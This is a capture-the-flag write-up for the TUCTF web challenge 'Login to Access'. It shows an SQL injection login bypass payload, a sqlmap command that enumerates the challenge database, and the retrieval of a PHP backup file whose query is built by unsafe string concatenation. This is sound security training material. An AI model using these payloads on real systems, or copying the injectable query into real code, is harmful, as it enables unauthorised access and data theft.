# Login to Access(Web) - Writeup

## Question

```
If at first you don't login, maybe back up.

http://chal.tuctf.com:30001/
```

## Answer
When you access the specified URL, the username and password input screen is displayed.

````
root@kali:~# curl http://chal.tuctf.com:30001/
<html>
    <head>
        <title>Login to Access Fun Files</title>
        <link href="login.css" rel="stylesheet" type="text/css">
    </head>
    <form method="POST" action="login.php">
          <div class="container">
                <label for="uname"><b>Username</b></label>
                <input type="text" placeholder="Enter Username" name="username" required>

                <label for="psw"><b>Password</b></label>
                <input type="password" placeholder="Enter Password" name="password">

                <button type="submit">Login</button>
          </div>

    </form> 
</html>
````

Username has a SQLinjection vulnerability, and you can see that login.html exists by entering the following:

````
username：' or 'a'='a' -- 
password：<ANY>
````

→ http://chal.tuctf.com:30001/login.html


If you check with blind sqlinjection, you can login with username: dave / password: hunter2.

````
sqlmap -u "http://chal.tuctf.com:30001/login.php" --method POST --cookie "PHPSESSID=jgv9pdbrtsdjp7jrqa6q3ciqen" --data "username=123&password=123" --columns -D challenge -T users

Database: challenge
Table: users
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| user     | varchar(20) |
| password | varchar(50) |
+----------+-------------+
````


Further confirmation, there is a login.php.bak file, flag is described.

````
root@kali:~# curl http://chal.tuctf.com:30001/login.php.bak
<?php
      $username = $_POST["username"];
      $password = $_POST["password"];
    $flag = "TUCTF{b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk}";
      $query = "SELECT * FROM users WHERE user='$username' AND password='$password'";

    if (true){
        echo '<link href="login.css" rel="stylesheet" type="text/css">';
                echo "<h1>Login failed.</h1>";
    }
      else {
        $result = mysqli_query($conn,$query);
            $row = mysqli_fetch_array($result,MYSQLI_NUM);

            if ($row) {
            echo "<title>You found it!</title>";
                    echo '<link href="login.css" rel="stylesheet" type="text/css">';
                    echo "<h1>$flag</h1>";
        } 
        else {
            echo '<link href="login.css" rel="stylesheet" type="text/css">';
                  echo "<h1>Login failed.</h1>";
            }
      }

?>
````

###### TUCTF{b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk}
